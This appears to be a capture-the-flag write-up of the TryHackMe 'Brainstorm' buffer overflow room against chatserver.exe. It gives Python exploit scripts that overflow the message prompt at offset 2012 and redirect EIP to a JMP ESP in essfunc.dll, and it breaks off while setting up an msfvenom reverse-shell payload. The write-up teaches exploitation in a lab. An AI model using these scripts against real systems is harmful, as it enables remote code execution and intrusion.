
---

### Deploy Machine and Scan Network

- ![image](https://user-images.githubusercontent.com/94720207/169630982-d1f14ae0-f3ab-4674-8d7a-11c6b34bc894.png)

- ![image](https://user-images.githubusercontent.com/94720207/169433751-06697c6d-d27a-451f-8afb-1b7fba777dac.png)

---

### Accesing Files

1. First I will check that `FTP` port accesing with `anonymous` login and download the `chatserver.exe` and the `essfunc.dll` from the folder "chatserver".
    
    - ![image](https://user-images.githubusercontent.com/94720207/169436929-93cad986-8310-402d-aa84-c4f39d72d45c.png)
    
2. As this is a buffer overflow Lab, it seems we got out `.exe` and `.dll` to exploit, so, nothing much more to do here...
    
    - **Note: It's a little bit obvious that this room is based on the "Vuln Server" exploit, using default port 9999 and `essfunc.dll`...**
    
    - **Actually, `Vuln Server` is allmost the same walkthrought as `Brainstorm`, I reccomend read that write up too since it's explained in detail the buffer overflow process** 
        
    - [**Click here to read the full write up I did for `Vuln Server`**](/Cyber-Security-&-Hacking/Buffer-Overflow/buffer-overflow.md)

### Lab Setup:

- I will use the same setup for `Vuln Server`:
        
    - Using Windows 10 Pro on a bare metal CPU
        - `chatserver.exe` + `.dll` running here
        - `Immunity Debugger` + `mona` running here
                
    - Using Kali Linux in a VMware Pro VM
        - `python` scripts and tricky tricks running here
            
    - Both machines connected on the same Network 192.168.1.0/24 (My local Network)
            
    - Once I've exploited the program `vulnserver.exe` in my own machine, then I can exploit "the real" server with the final script:
            
        - `TryHackMe - Brainstorm` Network, UK.    
        
    - So I will transfer the files from the TryHackMe Machine-FTP to a folder to my Windows 10 and use from there `Immunity Debugger` and also run the `chatserver.exe` binary.
        
        - ![image](https://user-images.githubusercontent.com/94720207/169447433-211b2e85-534b-4bd5-9f2f-ff799b1472d1.png)
          
    - Easy! Let's do it! 

---

### Buffer Overflow

- I will use the same steps used in `Vuln Server` lab... this steps work with allmost all the buffer overflow procedures:

- **Steps to conduct a buffer overflow:**

    1. Spiking - Method to find vuln part of the program
    2. Fuzzing - Send a bunch of characters and see if we can break it
    3. Finding the Offset - At what point did we break it
    4. Overwriting the EIP - Overwriting the Poiting Address and control it
    5. Finding Bad Characters - ...
    6. Finding the Right Module - ...
    7. Generating Shellcode - Once we know the bad characters and right module we can generate a shellcode
    8. Root!

---

### Spiking + Fuzzing

- First of all, I will run `chatserver.exe` as administrator and then start `Immunity Debugger` and attach the program. 
    
    - ![image](https://user-images.githubusercontent.com/94720207/169447906-08c9b9a4-ae4a-4634-801f-260fe36a3f63.png) 

    - ![image](https://user-images.githubusercontent.com/94720207/169447827-45f81402-77c1-4a3e-af73-bae1465a264d.png)

- Then, I will run the Immunity Debugger with "play".

    - ![image](https://user-images.githubusercontent.com/94720207/169448256-98b7a075-5faf-466c-a79b-0845450d1362.png)

        - Running and ready to go!

- On Kali Linux:

    1. Connect to ChatServer:
        
        - Using the IP Address of the Windows Machine **192.168.10.100** + VulnServer Port **9999** (Default)
            
        - ![image](https://user-images.githubusercontent.com/94720207/169188519-02fab4e5-91e4-4272-a788-9239ad878c4a.png)
           
        - On Kali: `nc -nv 192.168.1.100 9999`
            
        - ![image](https://user-images.githubusercontent.com/94720207/169448471-a117bef5-2d59-40e8-9a37-19f0aeb3b263.png)
 
 - **It looks that this program `Chat Server` take commands based on what you type AKA `strings` to generate a `username`**
 
 - **The username request a `max of 20 characters`**
 
     - This means, maybe the buffer overflow and/or the pointer of `EIP` that we need to exploit is located after those 20 characters...maybe 21...maybe 2739?, 666?!, who knows?!
     
     - So, **we will do our `spiking` and `fuzzing` process to know how many bytes do we need to crash the program `chatserver.exe`**
     
         - _Actually, in this scenario is more only `fuzzing` process, because we don't need a command or string before_ 
     
- **As difference with `Vuln Server` Lab, here we are NOT using commands, just a user `string`**

    - **So, instead of using **`generic_send_tcp`** technique and spiking the strings, I will write a simple python script doing the following:**

```python
#!/usr/bin/python

print "A" * 5000
```

- Or just using a python command:

    - `python -c 'print "A" * 5000'` 

- With this simple script we will generate 5000 bytes of "A's" at once:

    - ![image](https://user-images.githubusercontent.com/94720207/169452006-9a56b1a1-57e0-4207-bebd-3ab5640cb374.png)

- And we will copy and paste it to the program, it's just like a "manual fuzzing" adn then press `enter`:

    - ![image](https://user-images.githubusercontent.com/94720207/169452204-f1194a76-9fce-4845-8ed0-0b7618825ffb.png)

- The program didn't crash, it still working and is prompting for more info, meanwhile the `chatserver.exe` looks like this:

    - ![image](https://user-images.githubusercontent.com/94720207/169454155-e667ae59-3089-4558-8e01-4ca8d70afb6d.png)
    
        - **It looks like there are no more than 20 A's, this means, this string is protected and IS NOT VULNERABLE because it's handling correctly the `buffer space`**
        
- After we press enter we found another prompt asking for a message: 

    - ![image](https://user-images.githubusercontent.com/94720207/169453925-09edcc12-9a61-46f8-9578-33c4e0c3e970.png)

- We can add any string we want and it don't show a maximum of chars, maybe the developer forgot to sanitize this input ;) 

    - ![image](https://user-images.githubusercontent.com/94720207/169455148-cc60b367-2882-49e1-874c-570e3d92f791.png)

- Hoew about trying to crash this prompt then?... 5000 A's I choose you!!!

    - ![image](https://user-images.githubusercontent.com/94720207/169455285-758afe2b-f9ab-46a9-a663-14e637ccfa4b.png)
    
- BOOM!!! We did it!!! The `chatserver.exe` have just crashed

    - ![image](https://user-images.githubusercontent.com/94720207/169455495-f7924ac6-a8da-42e6-ae57-f6c1c10e08db.png)

- Bota fixa papai!

    - If we look at `EBP` we can see `41414141`: THAT'S THE HEX CODE FOR: `AAAA`
    
        - ![image](https://user-images.githubusercontent.com/94720207/169456928-65563691-936f-441c-9ade-edf2f7c31752.png) 

    - Also, we went over `ESP` with a bunch of "A"

    - Finally, we get into `EIP` too with `41414141`: THA'TS THE HEX CODE FOR: `AAAA`

        - Something like this _(the same as Vuln Server Lab!)_: 
        
            - ![image](https://user-images.githubusercontent.com/94720207/169455788-c8e5d6de-ef79-4b4d-9de3-1aee3aa4c8a1.png)

- Remember: **The `EIP` is the important factor!**

    - If we control `EIP` we can point somethin malicious! But for that, we need to locate "where's `EIP` now?"

- NOTE: The program has crashed, so we will need to restart the `Chat Server` and attach it again to the `Immunity Debugger`

    - **It's better to close everything and start from 0 to avoid errors** 

- We already know that the program `Chat Server` can crash somewhere if we send a string overflow of 5000 bytes (A's)

- **As difference with `vuln server` we did this process a lot quickier, that's because in this scenario we did not needed `spiking`.**

    - **Instead, with just a bunch of "A's" we did realize that the string can crash the program, that means now we need to `find the offset`
    
- we just need to know aprox where we crashed the program, and we know is somewhere around **less than 5000 bytes**

    - Now, that we know that the crash is somewhere less 5000 bytes, we need to know: **where's the `EIP` value at?**

    - Remember, controlling the `EIP` is the puprose of all of this attack. 

---  

### Finding the Offset

- First of all, restart everything because the last crash...

- We are going to be looking for where the overwirte the `EIP`: 

    - Because controlling EIP means control the shellcode of the program (so we can send malicious scripts like a reverse shell).
    
- **For this step, we will use the tool `pattern_create` by Metasploit:**

- ![image](https://user-images.githubusercontent.com/94720207/169311872-83277c19-e042-4cab-8b48-197682ac4d15.png)
 
    - In Kali machine (-l is for lenght):
    
        - `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5000`
    
    - ![image](https://user-images.githubusercontent.com/94720207/169460983-5457be7f-4a12-4f88-b31d-1d11a6a07153.png)
 
        - Now, instead of sending a bunch of `A`'s we will send the "crazy code", or better said, the pattern algorythm to find the offset.
        
            - **Note: Again, the difference with `vuln server` is that we don't need a string before or something else, se just copy and paste the pattern just like we did with the A's**
            
        - ![image](https://user-images.githubusercontent.com/94720207/169463114-bdcc5a86-fa84-4572-8170-17a11ac09095.png)
        
            - We crashed the `chatserver.exe` again, this time with the pattern:
            
        - ![image](https://user-images.githubusercontent.com/94720207/169463344-8af7eaf7-4f5b-4ceb-a11c-03d35fc51146.png)
 
 - When we send that crazy string we going to get the value on the `EIP` like magic, but how it works?

    1. We send the "crazy code" and we know that in some point it will crash (because it have more than **2700** characters).
    
        - **That "crazy code" is actually a pattern alogythm of characters, so Metasploit can identify the bytes where the crash exactly happened! booom!!!**
    
    3. After the crash, we going to say to Metasppoit:
    
        - **The program have crashed with the `pattern_create`, identify exactly where it crashed, plz! :3.**    

    - Just like in fuzzing: We sent _"TRUN /.:/ Cr4zyCodeCr4zyCodeCodeCr4zyCode..."_ (instead of A's) and matched "the perfect world"
    - We also overwrite `ESP`, `EBP` and `EIP`.
    - It's very similar to the A's, **but in this case we used the Metasploit character `pattern_creator` AKA "the crazy code"**
    
        - NOTE: We can know that we passed by far the crash zone (just like with A's) because we can see a large string on ESP-
        - Remember!: 
        
            1. The perfect world is the large string in `EAX`
            2. Any other large string means that we overwrite that register (`ESP`) by a looooot of chars 
            3. But, the important thing here is that we overwrite `EIP`
        
                - ![image](https://user-images.githubusercontent.com/94720207/169463344-8af7eaf7-4f5b-4ceb-a11c-03d35fc51146.png)
       
            - **The important and critic value here then is the `EIP`:**
            
                - **`31704330`** 
                            
            - Let's use this value to abuse the vulnerability!

- This step is similar to the last one, but instead of using `pattern_create` tool, we will use `pattern_offset`:

- ![image](https://user-images.githubusercontent.com/94720207/169327203-1bd951d1-a149-4e20-ba65-cecb5cad7020.png)

    - In Kali machine (-l is for lenght), (-q is for query, our finding of the exact **pattern**):
    
        - `/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 50000 -q 31704330`
   
    - After we press "enter", we should find a **pattern offset**:
    
        - ![image](https://user-images.githubusercontent.com/94720207/169464317-4549f6d6-6022-4964-bbf1-e126d1bad552.png)

    - **Now we know that the exact offset value si `2012`** but how?
    
        - Metasploit just searched between the 5000 pattern the pattern which match exactly "31704330"
        - That exact pattern started just at `2012 bytes`, like a "crossover" ot better said: the offset
        
            - **This information is critical, because this means that exactly at `2012 bytes`, we can control `EIP` overwriting it**

---

### Overwriting the EIP

- We know that the offset for make the program crash and point exactly to the `EIP` is at `2012 bytes`.

    - **That means, `2012 bytes` just before to get to the `EIP`**
    
    - **The `EIP` itself is `4 bytes` long** 
    
- So, we going to overwrite this specific `4 bytes` just after we fill those `2012` bytes ;)  

    - **I will use the next python script for the whole Lab, so I will comment line by line _(Script without comment below)_**
    
    - This will be saved as `1_fz3r0_brainstorm.py`  

```python
    # We declare we are using python:
    
#!/usr/bin/python

    # Import Socket is used to make the connection OUT (script[kali] >> target[windows chatserver.exe])
    # Very similar to netcat
    
import socket

    # Sys Module allows operating on the interpreter as it provides access to the variables and functions that interact strongly with the interpreter.
    # For example: "print(sys.version)" will bring something like "id" linux bash command.
    
import sys

    # 1 - The "chatserver.exe" prompt for a << name >> (no vulverable to buffer overflow)
    #     variable ---> username
    #     b        ---> "b" is used before the string to send the string as Bytes and no as String
    
username = b"fz3r0"

    # 2 - The "chatserver.exe" prompt for a << message >> (vulverable to buffer overflow!!!)
    #     variable ---> message
    
        # =-=-=-=-=-=-=-=-= The variable message contains the next trick! =-=-=-=-=-=-=-=-=-=-=
    
        # "A" * 2012    ---> I'll send 2012 bytes (A's) each time
        #                    Remember, 2012 bytes is exactly the offset we use to make the system crash and point to the starting byte of EIP!!!
        
        # "B" * 4       ---> We are using "B" to identify the EIP, because "A" will reach to the "perfect world" buffer, then "B" will overwrite just the EIP spot! 

        # "b"           ---> "b" is used before the string to send the string as Bytes and no as String
        
message = b"A" * 2012 + b"B" * 4

    # The script will start the loop with "try"
    # "Try every time to insert 2012 bytes of A's, followed by 4 bytes of B's, until crash!" 

try:
        
            # Print message to console:
        
        print("X:\>Fz3r0.buffer_overflow> Sending evil payload...")
        
            # I'll use the socket module to create the variable "s"
            # This is a very standard usage of the module socket to get IPv4:PORT = Socket
            # We will define out RHOST & RPORT (Target/Windows 10 > chatserver.exe)
        
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('192.168.1.100',9999))
        
            # Once it connects with the RHOST, the script will recieve "intro" Data back from it (The welcome message and that stuff...)
            # It could work with one line, but for double checking I will try to recieve 2 packages just in case (maybe the "intro" of the program is divided in 2 load screen or something...)
            
        s.recv(1024)
        s.recv(1024)

            # Once it connects with the RHOST, and recieve the "intro" data, the program start to prompt for data.
            # I will use the Socket Module and variable "s" to send data to the chatserver
            
                # 1. First, "chatserver.exe" prompt for a << name >> (no vulverable to buffer overflow)
                
                    # send      = "send this"
                    # username  = "fz3r0"
                    # '\r\n\'   = \return \new line (like pressing "enter")
                    # b         = "b" is used before the string to send the string as Bytes and no as String"

        s.send(username + b'\r\n')

            # Recieve data again (I'm sure is only 1 package this time, the prompt for the message)
            # So, here I recieve the "message prompt" from the server:
             
        s.recv(1024)
                
                # 2 - Then, "chatserver.exe" prompt for a << message >> (vulverable to buffer overflow!!!)
                    
                    # send      = "send this"
                    # message   = "b"A" * 2012 + b"B" * 4" (++++ tricky payload ++++)
                    # '\r\n\'   = \return \new line (like pressing "enter")
                    # b         = "b" is used before the string to send the string as Bytes and no as String"

        s.send(message + b'\r\n')
       
            # Recieve data again
            
        s.recv(1024)
       
            # Close connection with RHOST
            # End of the loop
       
        s.close()

    # Exception script in case some error happen, return a message and exit. 

except:
        print("X:\>Fz3r0.buffer_overflow> Error connecting to server!!! Do'nt ask me, I'm just a script!!! >.<")
        sys.exit()
```

- **No comment version:**

```python  
#!/usr/bin/python

import socket
import sys

username = b"fz3r0"
message = b"A" * 2012 + b"B" * 4

try:        
        print("X:\>Fz3r0.buffer_overflow> Sending evil payload...")    
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('192.168.1.100',9999))      
        s.recv(1024)
        s.recv(1024)
        s.send(username + b'\r\n')
        s.recv(1024)
        s.send(message + b'\r\n')    
        s.recv(1024)
        s.close()
        
except:
        print("X:\>Fz3r0.buffer_overflow> Error connecting to server!!! Do'nt ask me, I'm just a script!!! >.<")
        sys.exit()
```

- `chmod +x` to the script to make it executable:

    - ![image](https://user-images.githubusercontent.com/94720207/169585902-a9fdffe6-3798-45c9-a748-a2ad4d5ba6a4.png)

- Check that `chatserver.exe` and `immunity debugger` are running (otherwise restar) and...

    - Execute it! Que chille!!! 
    
        - **`python3 1_fz3r0_brainstorm.py`**  

    - ![image](https://user-images.githubusercontent.com/94720207/169586705-8ff8a617-c2ac-4c9a-b5b4-bb0f483378cd.png)

        - Note: Close it with Ctrl+C to end script
        
    - The program crashes, that's perfect! let's see `Immunity Debugger`
    
        - ![image](https://user-images.githubusercontent.com/94720207/169587176-021d61a0-50f4-4756-943d-f8344083911e.png)

     - And this is how it looks our precious `BBBB` or `42424242`
     
     - We did it, and the EIP looks something like this: 
    
         - ![image](https://user-images.githubusercontent.com/94720207/169587833-81ba2c87-7669-47e8-b791-489563530da9.png) 
            
            - **Boooom!!!** 
            
    - **We succesfully overwritten the `EIP` and we have control of it**, but just with an inocent "BBBB" (4 bytes)...
    
        - **It's time to overwirte it with some malicious shellcode containung a 4 bytes of deadly poison!**  

---

### Finding Bad Characters

- When we generate a `shellcode` we need to know what are the `good characters for the shellcode` and the `bad characters for the shellcode`.

    - We can do that by running **ALL THE HEX CHARACTERS** throught our program and see if any of them act up.
    
    - By default, the `Null Byte` : `x00` acts up
    
    - ![image](https://user-images.githubusercontent.com/94720207/169364386-bed635cb-9074-4648-8e94-3692e5cf79d7.png)

- So, we going to see how it's look like and if any of this `bad characters` act up in the program (Vuln Server)

    - If you google-fu `badchars` or follow [this link from bulbsecurity](https://www.bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/) (view page source for copy/paste it Mr. Hacker :P) or just use this:
    
```
badchars = ("\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
```

- Then, we will copy the badchars code to a new variable called `badchars`

    - **Important!** Erase the Nullbyte `\x00` and initial string `badchars =` **that's a `badchar` that makes a lot of issues by default**
    
    - **Inser "b"'s before each shellcode line (to convert to bytes each string)** 
    
    - In my case, I will save it as another file `2_fz3r0_brainstorm.py` 

- Aditionally,  I will modify the line `s.send message` with this:

    - `s.send(message + badchars + b'\r\n')` 

- 

```python  
#!/usr/bin/python

import socket
import sys

username = b"fz3r0"
message = b"A" * 2012 + b"B" * 4
badchars = (b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
b"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
b"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
b"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
b"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
b"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

try:        
        print("X:\>Fz3r0.buffer_overflow> Sending evil payload...")    
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('192.168.1.100',9999))      
        s.recv(1024)
        s.recv(1024)
        s.send(username + b'\r\n')
        s.recv(1024)
        s.send(message + badchars + b'\r\n')    
        s.recv(1024)
        s.close()
        
except:
        print("X:\>Fz3r0.buffer_overflow> Error connecting to server!!! Do'nt ask me, I'm just a script!!! >.<")
        sys.exit()
```

- `chmod +x` to make it executable:

    - ![image](https://user-images.githubusercontent.com/94720207/169592442-abecb077-b523-42d1-b476-fbdc0d000f13.png)

- Execute it! Que chille!!!

    - ![image](https://user-images.githubusercontent.com/94720207/169593101-dc91ca54-8890-4ea4-ae0d-536a5fbae2ed.png)

    - The program crashes, that's perfect! let's see `Immunity Debugger` and send `ESP` to follow in dump (bottom left corner) 
    
        - ![image](https://user-images.githubusercontent.com/94720207/169593293-0d3b0763-2978-4e96-81f3-45dcc1b72d25.png)

- Now, let's take a look at the dump (bottom left corner):
    
    - ![image](https://user-images.githubusercontent.com/94720207/169594119-14deb603-ddc5-419e-a153-4b0750df1585.png)
    
    - **It's easy to read it, it's just a sequence number going: 1,2,3,4,5,6,7,8,9,10<---- but in HEX...**
    
        - This means:
    
            - We are looking for a bad char in between all that sequence, if any number is missing on the sequence, then, it means that char is being used and it's a `bad char`, just like that...
        
            - **In this Lab of `Brainstorm`, there are NOT bad chars!!! (Well...only x00 that we deleted since start) That's why we cannot see any "weird" sequence like: 1,2,3,5,6...**
            
            - All numbers flow correctly from `1` to `FF` 
        
            - In technic words, we are specting all that characters to happen.
            
            - The last thing we sent was `FF`, so if we search for `FF` at the end of the list, that means that we need to search only from the beginning to `FF`.

- **Just as an example** of a `bad char` let's see this Dump from **another Lab** 

    - ![image](https://user-images.githubusercontent.com/94720207/169384923-46ad25d7-56bb-4323-ba5d-05576cdae939.png)

        - Right away in the first line we saw a "weird" sequence: **1,2,3... `B0`, `B0` ...6, 7, 8**
        
        - This means `B0` is a `bad char`, we need to note all `B0`s including the missing numbers that this miss-sequence originates.
    
    - **Write down all this numbers, because we need them to generate the final shellcode to gain root!!!**
    
        - NOTE: Remember, in this lab there are NOT `bad chars` this was just an example! 

---

### Finding the right module

- Finding the right module means that we are looking for a `.dll` or something similar inside our program (Vuln Server) that has no memory protections.  

- No memory protections means: `no depth`, `no ASLR`, `no safe SEH`, etc.

    - **There's a tool called `Mona Modules` that makes the life much easier for that... ;)**
  
        - `**Mona` is used within `Immunity Debugger` to achieve this. [Direct Link to Mona Modules](https://github.com/corelan/mona)**
        
        - You only need to **[download the mona.py file](https://raw.githubusercontent.com/corelan/mona/master/mona.py)**
        
        - Then, put it on the same folder as **Immunity Debugger PyCommands**:
        
            - `C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands`
            
            - ![image](https://user-images.githubusercontent.com/94720207/169390146-a78e60dc-5218-4877-8f35-6b39c243313b.png)
                    
        - That's all!!! We got `Mona` ready to use.

- Once everything is ready, we can start `vuln server` and `Immunity Debugger`, attach the program, etc.

    - **To use `Mona Modules`, the only extra thing to do now is typingon the bottom bar before `play` it:
    
        - `!mona modules` (and hit >Enter<) 

        - ![image](https://user-images.githubusercontent.com/94720207/169392574-6d6d7ca4-04c8-4749-a1a0-b726ee7fc08d.png)

- _NOTE: If the windows if Immunityu Debugger goes crazy, just close all windows, select: view > cpu, maximize it, and move the tiles again ;)_

    - After pressing enter using the command `!mona modules` this window pop-up _(click to enlarge)_:
    
    - ![image](https://user-images.githubusercontent.com/94720207/169595591-f0057f77-897b-4148-b6bc-3e85d22d1b28.png)

        - First of all, that rows marked with `blue` are the `Protection Settings`
        
        - Some are `False` and others are `True`...
        
        - We are looking for `False`, because that means that "something" does not have any protection, for example, `essfunc.dll` down not have any protection = `False,False,False,False`
        
            - This means: **We are looking for something attached to Vuln Server (like a .dll) that doesn't have any protection, for example `essfunc.dll`, let's take a note of this and now do this other process:**    

- **Finding the opcode equivalent of a jump**

    - In Kali Linux:
    
        - We're going to locate something called `NASM shell`:
        
        - ![image](https://user-images.githubusercontent.com/94720207/169400501-202dd0b7-58fa-47ad-b3a2-1f120b7d8b02.png)
        
    - Ok, let's do this!
    
        - We're looking for the `opcode equivalent`
        
        - We are trying to convert `assambly language` into `HEX code` so we need to do:
        
            1. Run the `nasm_shell` script (directly from the original path, otherwise it doesn't work):
            
                - `/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb` 
            
                - ![image](https://user-images.githubusercontent.com/94720207/169401488-3dd91bcb-c2ea-4fcf-be75-7abdb76bc0c9.png)
                
            2. Type in `assembly language` `JMP ESP` which means: "Jump(command) to ESP(pointer)" 
            
                - ![image](https://user-images.githubusercontent.com/94720207/169410984-674a4a45-bcbf-49eb-ac3c-5e88371da587.png)

            3. Now we know that the `JMP ESP` equivalent in `HEX` is = `FFE4`!!!
            
                - So, now I will keep that HEX `FFE4` and take it to the `Immunity Debugger`

- Once in the `Immunity Debugger` we will type:

    -  `!mona find -s "\xff\xe4" -m essfunc.dll`

        - `-s` is used to find
        - `-m` is used for "module" 
        
    - ![image](https://user-images.githubusercontent.com/94720207/169596135-5d6ebaea-f0ae-42dd-b095-f1037ba74595.png)
    
        - We are searching here a `return address`
        
        - For example, the first row means the `retrun addresses`, so, if we start from the top we found:
        
            - **Return Address = `625014DF`** for `ssfunc.dll`

- **In Kali Machine**

    - Again, We only need to copy that code and modify the last python script or make new one.
    
    - In my case I will do a new python script called: `3_fz3r0_brainstorm.py`
    
        - **Delete "badchars" from the line `s.send(message + b'\r\n') `**
        
        - **We will delete from `shellcode = "A" * 2012 + "B" * 4 + badchars`; the ending: `"B" * 4 + badchars`:
        
            - Result: **`shellcode = "A" * 2012 +`**
            
        - **Now, remember the `BBBB`?... -it's the same script we used back then! ;)**   
        
        - **Now instead of using inocent `BBBB` we going to put out pointer "Return Address" =  `625014DF`
        
            - But we going to put it in a special mode! in **"reverse"** : **"2 by 2"**! 
            
                - Original = `625014DF`
                - Spaced   = `62 50 14 DF`
                - **Reversed** = **`DF 14 50 62`**
            
        - This **"Special Reverse"** actually is called technically `little endian format` whicH is used when we "talk" with `x86 Architecture`
        
        - This means, `x86 Architecture` actually stores the **low order byte at the lowest address** and the **high order byte at the highest address**. So we need to put it in reverse order...
        
            - What this should do now is this should throw the same "air" before, but it's going to hit a `jump point`.
            
            - We can do something special in `Immunity Debugger` to actually catch this.
            
                - So, we will save our new script:

```python  
#!/usr/bin/python

import socket
import sys

        # Remember x86 Architecture:

    # Original = `625014DF`
    # Spaced   = `62 50 14 DF`
    # Reversed = `DF 14 50 62`
    # Final    = "\xDF\x14\x50\x62"
    
username = b"fz3r0"
message = b"A" * 2012 + b"\xdf\x14\x50\x62"

try:        
        print("X:\>Fz3r0.buffer_overflow> Sending evil payload...")    
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('192.168.1.100',9999))      
        s.recv(1024)
        s.recv(1024)
        s.send(username + b'\r\n')
        s.recv(1024)
        s.send(message + b'\r\n')    
        s.recv(1024)
        s.close()
        
except:
        print("X:\>Fz3r0.buffer_overflow> Error connecting to server!!! Do'nt ask me, I'm just a script!!! >.<")
        sys.exit()
```

- `chmod +x` to make it executable:

    - ![image](https://user-images.githubusercontent.com/94720207/169599203-1ccde0a8-c74c-4285-b686-dedf7f742a6b.png)

- **Before execution!!! It's time for something special :D** 

    - First of all, in the top left corner we need to click `go to address in disassembler` (the blue arrow) 
    
        - ![image](https://user-images.githubusercontent.com/94720207/169600586-d3a2ce7f-afe5-4700-9b91-040438b5a275.png)
    
    - Then we will add the value of `625014DF` (Remember the **original** `pointer address` AKA our `jump code`?)
    
        - ![image](https://user-images.githubusercontent.com/94720207/169600691-7f222cd4-1db7-4e78-9f06-8aa865da4513.png)

    - We press enter or "ok", and it will find automatically `FFE4` !!! Remember??? The JMP ESP!!!:
    
        - ![image](https://user-images.githubusercontent.com/94720207/169600766-fb5bda6f-965a-4571-a10c-6b23c6b5bd69.png)
    
        - _"3. Now we know that the `JMP ESP` equivalent in `HEX` is = `FFE4`!!!"_
           
           - This means, it took us to our `jump code` = `JMP ESP` and that's exactly what we want!
           
           - Now, we goinf to hit `F2` in the keyboard, and it will turn the value aqua-blue.
           
           - ![image](https://user-images.githubusercontent.com/94720207/169600878-0c5ff5b7-b029-4fbf-8cd8-18abffb2f4e3.png)
           
           - **What we have just done is we've set a breakpoint:**
           
               - We have the `breakpoint` running, what this means is we're gonna overflow the buffer but if we hit this "specific spot" or `jump code` it's not going to jump to a further instruction.
               
               - **It's actually going to break the program (Vuln Server) and pause right here for further instruction from us**
               
               - So for now, we just want to know that we are hitting this > overriding the `EIP` > Located in the specific spot `breakpoint` > And we're gonna be able to jump forward.
               
    - **Press "Play" in the `Immunity Debugger`:
          
        - ![image](https://user-images.githubusercontent.com/94720207/169601062-2337489a-7b5e-4cdf-a048-1d4dc41ee99c.png)
       
    - **And then execute the script in Kali:**

        - ![image](https://user-images.githubusercontent.com/94720207/169602307-af75ce7d-db2b-43f0-980c-c316342cc815.png)
    
    - It crashes instantly again, and it shows the message **`Breakpoint at essfunc.625011AF`**
    
        - ![image](https://user-images.githubusercontent.com/94720207/169602362-02baf264-281b-46bd-90da-79071b9e7b73.png)

    - And the program (Chat Server) is now paused:
    
        - ![image](https://user-images.githubusercontent.com/94720207/169418035-8263d336-6e30-47e8-8090-7423ba6ed2e4.png)

    - **We have hit our `breakpoint` that means we `control this EIP`!!!** :D
    
        - ![image](https://user-images.githubusercontent.com/94720207/169602571-224895f2-3245-402a-80f9-1b8178b41558.png)
    
    - **We control the `EIP`! and now the only thing to do is generate a `shellcode` to gain a `root shell`**

--- 

### Generating and Gaining Shells

- We going to use `msfvenom` by `metasploit` to generate a payload

- Just like all the payloads generated in `msfvenom`, but I will mention this specific flags:

    - `-p windows/shell_reverse_tcp` = type of shell/payload
    - `LHOST` & `LPORT` = LOCAL>Attacker (Kali)
    - ![image](https://user-images.githubusercontent.com/94720207/169419352-75669845-c6a1-458f-be9a-25a409d2241c.png)
